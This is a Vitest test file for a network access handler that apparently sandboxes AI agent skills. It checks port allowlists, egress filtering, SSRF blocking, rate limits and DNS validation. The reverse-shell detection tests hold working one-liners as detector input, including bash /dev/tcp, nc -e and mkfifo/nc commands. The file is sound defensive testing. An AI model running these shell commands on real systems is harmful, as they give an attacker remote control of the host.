import { describe, it, expect, beforeEach } from 'vitest';
import { NetworkAccessHandler } from '../../src/handlers/network-access';
import { TorkConfig, TorkConfigSchema } from '../../src/config';
import { NetworkMonitor } from '../../src/utils/network-monitor';

function makeConfig(overrides: Partial<TorkConfig> = {}): TorkConfig {
  return TorkConfigSchema.parse({ apiKey: 'tork_test_key', ...overrides });
}

describe('NetworkAccessHandler', () => {
  let handler: NetworkAccessHandler;

  beforeEach(() => {
    handler = new NetworkAccessHandler(makeConfig());
  });

  // ── Port allowlist enforcement ────────────────────────────────

  describe('validatePortBind — port allowlist', () => {
    it('allows ports in the default inbound range (3000-3999)', () => {
      expect(handler.validatePortBind('skill-a', 3000).allowed).toBe(true);
      expect(handler.validatePortBind('skill-a', 3500).allowed).toBe(true);
      expect(handler.validatePortBind('skill-a', 3999).allowed).toBe(true);
    });

    it('allows ports in the 8000-8999 range', () => {
      expect(handler.validatePortBind('skill-a', 8000).allowed).toBe(true);
      expect(handler.validatePortBind('skill-a', 8080).allowed).toBe(true);
      expect(handler.validatePortBind('skill-a', 8999).allowed).toBe(true);
    });

    it('blocks ports outside allowed ranges', () => {
      const result = handler.validatePortBind('skill-a', 9000);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('not in the inbound allowlist');
    });

    it('blocks privileged ports (< 1024)', () => {
      const result = handler.validatePortBind('skill-a', 80);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('Privileged port');
    });

    it('blocks port 22 (SSH)', () => {
      const result = handler.validatePortBind('skill-a', 22);
      expect(result.allowed).toBe(false);
    });

    it('blocks port 443 for inbound', () => {
      const result = handler.validatePortBind('skill-a', 443);
      expect(result.allowed).toBe(false);
    });
  });

  // ── Port hijacking detection ──────────────────────────────────

  describe('validatePortBind — port hijacking', () => {
    it('allows the same skill to re-bind its own port', () => {
      handler.validatePortBind('skill-a', 3000);
      const result = handler.validatePortBind('skill-a', 3000);
      expect(result.allowed).toBe(true);
    });

    it('blocks a different skill from binding an occupied port', () => {
      handler.validatePortBind('skill-a', 3000);
      const result = handler.validatePortBind('skill-b', 3000);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('hijacking');
      expect(result.reason).toContain('skill-a');
    });
  });

  // ── Egress filtering — allowed/blocked domains ────────────────

  describe('validateEgress — domain filtering', () => {
    it('allows egress to any domain on default policy (no domain restriction)', () => {
      const result = handler.validateEgress('skill-a', 'api.openai.com', 443);
      expect(result.allowed).toBe(true);
    });

    it('allows egress on allowed outbound ports', () => {
      expect(handler.validateEgress('skill-a', 'example.com', 80).allowed).toBe(true);
      expect(handler.validateEgress('skill-a', 'example.com', 443).allowed).toBe(true);
      expect(handler.validateEgress('skill-a', 'example.com', 8080).allowed).toBe(true);
    });

    it('blocks egress on disallowed outbound ports', () => {
      const result = handler.validateEgress('skill-a', 'example.com', 22);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('Outbound port 22');
    });

    it('blocks egress to blocked domains', () => {
      const h = new NetworkAccessHandler(makeConfig({
        networkPolicy: 'custom',
        blockedDomains: ['evil.com'],
        allowedOutboundPorts: [443],
      }));
      const result = h.validateEgress('skill-a', 'evil.com', 443);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('blocked');
    });

    it('blocks subdomains of blocked domains', () => {
      const h = new NetworkAccessHandler(makeConfig({
        networkPolicy: 'custom',
        blockedDomains: ['evil.com'],
        allowedOutboundPorts: [443],
      }));
      const result = h.validateEgress('skill-a', 'sub.evil.com', 443);
      expect(result.allowed).toBe(false);
    });

    it('strict policy enforces domain allowlist', () => {
      const h = new NetworkAccessHandler(makeConfig({ networkPolicy: 'strict' }));
      const allowed = h.validateEgress('skill-a', 'api.openai.com', 443);
      expect(allowed.allowed).toBe(true);

      const blocked = h.validateEgress('skill-a', 'random-site.com', 443);
      expect(blocked.allowed).toBe(false);
      expect(blocked.reason).toContain('not in the allowlist');
    });
  });

  // ── Private network blocking (SSRF prevention) ────────────────

  describe('validateEgress — private network blocking', () => {
    it('blocks 127.0.0.1 (localhost)', () => {
      const result = handler.validateEgress('skill-a', '127.0.0.1', 80);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('Private network');
    });

    it('blocks 10.x.x.x', () => {
      const result = handler.validateEgress('skill-a', '10.0.0.1', 80);
      expect(result.allowed).toBe(false);
    });

    it('blocks 192.168.x.x', () => {
      const result = handler.validateEgress('skill-a', '192.168.1.1', 80);
      expect(result.allowed).toBe(false);
    });

    it('blocks 172.16-31.x.x', () => {
      const result = handler.validateEgress('skill-a', '172.16.0.1', 80);
      expect(result.allowed).toBe(false);
    });

    it('blocks 169.254.x.x (link-local / cloud metadata)', () => {
      const result = handler.validateEgress('skill-a', '169.254.169.254', 80);
      expect(result.allowed).toBe(false);
    });

    it('blocks "localhost"', () => {
      const result = handler.validateEgress('skill-a', 'localhost', 80);
      expect(result.allowed).toBe(false);
    });
  });

  // ── Rate limiting ─────────────────────────────────────────────

  describe('validateEgress — rate limiting', () => {
    it('blocks after exceeding connections/min limit', () => {
      const h = new NetworkAccessHandler(makeConfig({
        networkPolicy: 'custom',
        maxConnectionsPerMinute: 3,
        allowedOutboundPorts: [443],
      }));

      expect(h.validateEgress('skill-a', 'example.com', 443).allowed).toBe(true);
      expect(h.validateEgress('skill-a', 'example.com', 443).allowed).toBe(true);
      expect(h.validateEgress('skill-a', 'example.com', 443).allowed).toBe(true);
      // 4th should be rate-limited
      const result = h.validateEgress('skill-a', 'example.com', 443);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('Rate limit exceeded');
    });

    it('rate limit is per-skill', () => {
      const h = new NetworkAccessHandler(makeConfig({
        networkPolicy: 'custom',
        maxConnectionsPerMinute: 2,
        allowedOutboundPorts: [443],
      }));

      h.validateEgress('skill-a', 'example.com', 443);
      h.validateEgress('skill-a', 'example.com', 443);
      // skill-a is at limit
      expect(h.validateEgress('skill-a', 'example.com', 443).allowed).toBe(false);
      // skill-b is NOT at limit
      expect(h.validateEgress('skill-b', 'example.com', 443).allowed).toBe(true);
    });
  });

  // ── Reverse shell detection ───────────────────────────────────

  describe('validateEgress — reverse shell detection', () => {
    it('blocks egress when reverse shell pattern detected in recent shell history', () => {
      const monitor = handler.getMonitor();
      monitor.recordShellCommand('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1', 'skill-a');

      const result = handler.validateEgress('skill-a', 'attacker.com', 443);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('Reverse shell');
    });

    it('detects nc -e reverse shells', () => {
      const monitor = handler.getMonitor();
      monitor.recordShellCommand('nc -e /bin/sh 10.0.0.1 4444', 'skill-a');

      const result = handler.validateEgress('skill-a', 'attacker.com', 443);
      expect(result.allowed).toBe(false);
    });

    it('detects python socket reverse shells', () => {
      const monitor = handler.getMonitor();
      monitor.recordShellCommand(
        'python -c "import socket,subprocess;s=socket.socket()"',
        'skill-a'
      );

      const result = handler.validateEgress('skill-a', 'attacker.com', 443);
      expect(result.allowed).toBe(false);
    });

    it('does not flag clean shell commands', () => {
      const monitor = handler.getMonitor();
      monitor.recordShellCommand('ls -la', 'skill-a');
      monitor.recordShellCommand('npm install', 'skill-a');

      const result = handler.validateEgress('skill-a', 'registry.npmjs.org', 443);
      expect(result.allowed).toBe(true);
    });
  });

  // ── DNS validation — raw IP flagging ──────────────────────────

  describe('validateDNS', () => {
    it('flags raw IPv4 addresses', () => {
      const result = handler.validateDNS('skill-a', '93.184.216.34');
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('Raw IP');
    });

    it('flags raw IPv6 addresses', () => {
      const result = handler.validateDNS('skill-a', '::1');
      expect(result.allowed).toBe(false);
    });

    it('allows valid hostnames', () => {
      const result = handler.validateDNS('skill-a', 'api.openai.com');
      expect(result.allowed).toBe(true);
    });

    it('blocks hostnames on the blocklist', () => {
      const h = new NetworkAccessHandler(makeConfig({
        networkPolicy: 'custom',
        blockedDomains: ['evil.com'],
      }));
      const result = h.validateDNS('skill-a', 'evil.com');
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('blocked domain');
    });

    it('strict policy only allows domains on allowlist', () => {
      const h = new NetworkAccessHandler(makeConfig({ networkPolicy: 'strict' }));
      expect(h.validateDNS('skill-a', 'api.openai.com').allowed).toBe(true);
      expect(h.validateDNS('skill-a', 'unknown-host.xyz').allowed).toBe(false);
    });
  });

  // ── Activity logging / receipt generation ─────────────────────

  describe('activity logging', () => {
    it('logs all allowed actions when logAllActivity is true', () => {
      handler.validatePortBind('skill-a', 3000);
      handler.validateEgress('skill-a', 'example.com', 443);

      const log = handler.getActivityLog();
      expect(log.length).toBe(2);
      expect(log[0].allowed).toBe(true);
      expect(log[0].action).toBe('port_bind');
      expect(log[1].action).toBe('egress');
    });

    it('always logs denied actions', () => {
      handler.validatePortBind('skill-a', 22);

      const log = handler.getActivityLog();
      expect(log.length).toBe(1);
      expect(log[0].allowed).toBe(false);
    });

    it('includes skillId and timestamp in log entries', () => {
      handler.validatePortBind('my-skill', 3000);

      const log = handler.getActivityLog();
      expect(log[0].skillId).toBe('my-skill');
      expect(log[0].timestamp).toBeTruthy();
    });

    it('clearActivityLog empties the log', () => {
      handler.validatePortBind('skill-a', 3000);
      expect(handler.getActivityLog().length).toBe(1);
      handler.clearActivityLog();
      expect(handler.getActivityLog().length).toBe(0);
    });
  });
});

// ── NetworkMonitor unit tests ──────────────────────────────────────

describe('NetworkMonitor', () => {
  let monitor: NetworkMonitor;

  beforeEach(() => {
    monitor = new NetworkMonitor();
  });

  it('tracks port registrations', () => {
    monitor.registerPort(3000, 'tcp', 'skill-a');
    expect(monitor.getPortOwner(3000)?.skillId).toBe('skill-a');
    expect(monitor.getActivePorts().length).toBe(1);
  });

  it('unregisters ports', () => {
    monitor.registerPort(3000, 'tcp', 'skill-a');
    monitor.unregisterPort(3000);
    expect(monitor.getPortOwner(3000)).toBeUndefined();
  });

  it('tracks connections per minute', () => {
    monitor.recordConnection('a.com', 443, 'skill-a');
    monitor.recordConnection('b.com', 443, 'skill-a');
    monitor.recordConnection('c.com', 443, 'skill-b');

    expect(monitor.getConnectionsPerMinute('skill-a')).toBe(2);
    expect(monitor.getConnectionsPerMinute('skill-b')).toBe(1);
    expect(monitor.getConnectionsPerMinute()).toBe(3);
  });

  it('detects reverse shell patterns in shell history', () => {
    monitor.recordShellCommand('ls -la', 'skill-a');
    expect(monitor.checkRecentShellActivity().suspicious).toBe(false);

    monitor.recordShellCommand('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1', 'skill-a');
    const check = monitor.checkRecentShellActivity();
    expect(check.suspicious).toBe(true);
    expect(check.matches.length).toBe(1);
  });

  it('detects mkfifo + nc pattern', () => {
    monitor.recordShellCommand('mkfifo /tmp/f; nc 10.0.0.1 4444 < /tmp/f', 'skill-a');
    expect(monitor.checkRecentShellActivity().suspicious).toBe(true);
  });

  it('generates a network report', () => {
    monitor.snapshotStartupPorts([3000]);
    monitor.registerPort(3000, 'tcp', 'skill-a');
    monitor.registerPort(8080, 'tcp', 'skill-b');
    monitor.recordConnection('example.com', 443, 'skill-a');

    const report = monitor.getNetworkReport();
    expect(report.activePorts.length).toBe(2);
    expect(report.recentConnections.length).toBe(1);
    // Port 8080 wasn't in the startup snapshot → anomaly
    expect(report.anomalies.some((a) => a.includes('8080'))).toBe(true);
  });

  it('snapshotStartupPorts tracks initial state', () => {
    monitor.snapshotStartupPorts([80, 443, 3000]);
    expect(monitor.getStartupPorts().has(80)).toBe(true);
    expect(monitor.getStartupPorts().has(9999)).toBe(false);
  });

  it('reset clears all state', () => {
    monitor.registerPort(3000, 'tcp', 'skill-a');
    monitor.recordConnection('a.com', 443, 'skill-a');
    monitor.recordShellCommand('ls', 'skill-a');
    monitor.snapshotStartupPorts([3000]);
    monitor.reset();

    expect(monitor.getActivePorts().length).toBe(0);
    expect(monitor.getConnectionsPerMinute()).toBe(0);
    expect(monitor.getStartupPorts().size).toBe(0);
  });
});
